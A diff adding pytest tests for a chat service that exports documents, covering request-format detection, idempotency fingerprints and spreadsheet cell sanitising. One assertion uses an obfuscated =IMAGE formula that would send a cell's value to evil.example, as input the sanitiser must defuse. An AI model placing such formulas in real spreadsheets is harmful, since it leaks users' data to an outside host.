@@ -2,6 +2,7 @@ import asyncio
 from io import BytesIO
 import zipfile
 
+import pytest
 from docx import Document
 from openpyxl import load_workbook
 from pptx import Presentation
@@ -13,9 +14,11 @@ from backend.artifact_service import ArtifactService
 class DummyFiles:
     def __init__(self):
         self.stored: dict | None = None
+        self.calls: list[dict] = []
 
     async def store_bytes(self, **kwargs):
         self.stored = kwargs
+        self.calls.append(dict(kwargs))
         return {'id': 'fixture-file', **kwargs}
 
     @staticmethod
@@ -129,6 +132,36 @@ def test_supported_format_aliases():
     assert ArtifactService.normalize_format('excel') == 'xlsx'
 
 
+def test_artifact_fingerprint_is_stable_for_same_inputs_and_changes_with_content():
+    files = DummyFiles()
+    generator = ArtifactService(files)
+    common = {
+        'user_id': 'owner-1',
+        'format_name': 'docx',
+        'chat_id': 'chat-1',
+        'message_id': 'message-1',
+        'title': 'Decision memo',
+        'file_id': '00000000-0000-4000-8000-000000000099',
+    }
+
+    asyncio.run(generator.create(markdown='# Decision\n\nChoose A.', **common))
+    first = files.calls[-1]['idempotency_fingerprint']
+    first_file_id = files.calls[-1]['file_id']
+    asyncio.run(generator.create(markdown='# Decision\n\nChoose A.', **common))
+    second = files.calls[-1]['idempotency_fingerprint']
+    second_file_id = files.calls[-1]['file_id']
+    asyncio.run(generator.create(markdown='# Decision\n\nChoose B.', **common))
+    changed = files.calls[-1]['idempotency_fingerprint']
+    changed_file_id = files.calls[-1]['file_id']
+
+    assert first == second
+    assert first != changed
+    assert first_file_id == second_file_id
+    assert first_file_id != changed_file_id
+    assert len(first) == 64
+    assert files.calls[-1]['logical_artifact_id'] == common['file_id']
+
+
 def test_natural_language_document_requests_are_detected():
     assert ArtifactService.detect_request(
         'Write the full manuscript and send it as a Word documented file.'
@@ -138,6 +171,110 @@ def test_natural_language_document_requests_are_detected():
     assert ArtifactService.detect_request('Could you deliver this in a document format?') == 'docx'
     assert ArtifactService.detect_request('Put this into a Word doc.') == 'docx'
     assert ArtifactService.detect_request('Write a report here in the chat.') is None
+
+
+@pytest.mark.parametrize(
+    ('message', 'expected'),
+    [
+        ('Create a video from this PDF.', None),
+        ('Create a video report from this PDF', None),
+        ('Create a video and a PDF report', None),
+        ('Create a video using this Word document.', None),
+        ('Generate a video from the attached document.', None),
+        ('Create an image using this PowerPoint.', None),
+        ('Create an image report from this PowerPoint', None),
+        ('Create an image from this PDF document.', None),
+        ('Write a novel based on this PDF.', None),
+        ('Write a summary of the attached PDF.', None),
+        ('Write a review of this PDF.', None),
+        ('Draft an analysis of the uploaded Word document.', None),
+        ('Convert this Word document to PDF.', 'pdf'),
+        ('Turn this PDF into a Word document.', 'docx'),
+        ('Use this PowerPoint to make a PDF report.', 'pdf'),
+        ('Create a PowerPoint presentation about our video campaign.', 'pptx'),
+        ('Create a Word document describing these image concepts.', 'docx'),
+        ('Create an image, then export the finished brief as a PDF.', 'pdf'),
+        ('Make this a PDF.', 'pdf'),
+        ('Send it as a DOCX.', 'docx'),
+        ('Create a Word report about PowerPoint design.', 'docx'),
+        ('Create a report about this video', 'docx'),
+        ('Create a report from this PDF', 'docx'),
+        ('Create a book report', 'docx'),
+        ('Make a cover letter using this resume', 'docx'),
+        ('Create a document with an image', 'docx'),
+        ('Create a report including one logo', 'docx'),
+        ('Create a document containing two images', 'docx'),
+        ('Create a report featuring our logo', 'docx'),
+        ('Create a report about PowerPoint design.', 'docx'),
+        ('Create a document about Excel formulas.', 'docx'),
+        ('Write an essay about PDF security.', 'docx'),
+        ('Create a report analyzing this PowerPoint presentation.', 'docx'),
+        ('Create a report reviewing this PDF.', 'docx'),
+        ('Create a book summary PDF.', 'pdf'),
+        ('Create a book report PDF.', 'pdf'),
+        ('Create a novel outline DOCX.', 'docx'),
+        ('Make a Word outline for this novel.', 'docx'),
+        ('Create a screenplay analysis PDF.', 'pdf'),
+        ('Create a downloadable report about our video campaign.', 'docx'),
+        ('Write a document analyzing this image.', 'docx'),
+        ('Create a proposal for the book launch.', 'docx'),
+        ('Draft a report reviewing this novel.', 'docx'),
+        ('Create a PDF logo for my app.', None),
+        ('Generate a Word document icon.', None),
+        ('Create a PowerPoint-themed image.', None),
+        ('Make an Excel spreadsheet icon.', None),
+        ('Create a PDF cover image.', None),
+        ('Generate a presentation poster.', None),
+        ('Create a proposal video.', None),
+        ('Create a report image.', None),
+        ('Create a report-style image.', None),
+        ('Generate a report cover.', None),
+        ('Make a manuscript cover.', None),
+        ('Create a PDF-style image.', None),
+        ('Convert this PDF to Word.', 'docx'),
+        ('Export this as Word.', 'docx'),
+        ('Send it in Word.', 'docx'),
+        ('Create an image in PDF style.', None),
+        ('Create a video in PowerPoint style.', None),
+        ('Generate a photo in Word style.', None),
+        ('Make this image into a PDF.', 'pdf'),
+        ('Turn this video into a PowerPoint.', 'pptx'),
+        ('Summarize this PDF in a Word document.', 'docx'),
+        ('Summarize this PDF as a Word document.', 'docx'),
+        ('Rewrite this PDF as DOCX.', 'docx'),
+        ('Summarize this PDF.', None),
+        ('Analyze this PowerPoint.', None),
+        ('Write a PDF parser.', None),
+        ('Create a PowerPoint generator.', None),
+        ('Build an Excel importer.', None),
+        ('Make a PDF viewer.', None),
+        ('Write a PDF report.', 'pdf'),
+        ('Create a PowerPoint presentation.', 'pptx'),
+        ('Make this a PDF.', 'pdf'),
+        ('Document this parser as a PDF.', 'pdf'),
+    ],
+)
+def test_document_detection_distinguishes_source_files_from_requested_outputs(message, expected):
+    assert ArtifactService.detect_request(message) == expected
+
+
+@pytest.mark.parametrize(
+    ('history_message', 'follow_up'),
+    [
+        ('Create a video from this PDF.', 'Export it.'),
+        ('Create an image using this PowerPoint presentation.', 'Make that downloadable.'),
+        ('Write a novel based on this PDF.', 'Send it as a file.'),
+        ('Write a summary of the attached PDF.', 'Send it as a file.'),
+        ('Draft an analysis of the uploaded Word document.', 'Make that downloadable.'),
+        ('Review this PowerPoint presentation.', 'Export that.'),
+    ],
+)
+def test_follow_up_delivery_does_not_export_a_source_reference(history_message, follow_up):
+    history = [
+        {'role': 'user', 'content': history_message},
+        {'role': 'assistant', 'content': 'The requested creative work is ready.'},
+    ]
+    assert ArtifactService.detect_request(follow_up, history=history) is None
 
 
 def test_contextual_document_delivery_follow_ups_survive_router_failure():
@@ -423,6 +560,7 @@ def test_spreadsheet_export_is_structured_typed_filterable_and_safe():
     assert '$' in data_sheet['B4'].number_format
     assert isinstance(data_sheet['B5'].value, __import__('datetime').datetime)
     assert generator._typed_cell('=SUM(B2:B4)')[0] == '=SUM(B2:B4)'
+    assert generator._typed_cell('=IMAGE(CONCAT("ht","tps","://evil.example/",A1))')[0].startswith("'=")
     assert generator._typed_cell('=HYPERLINK("https://bad.example","open")')[0].startswith("'=")
     assert generator._typed_cell("='[external.xlsx]Sheet1'!A1")[0].startswith("'=")
 
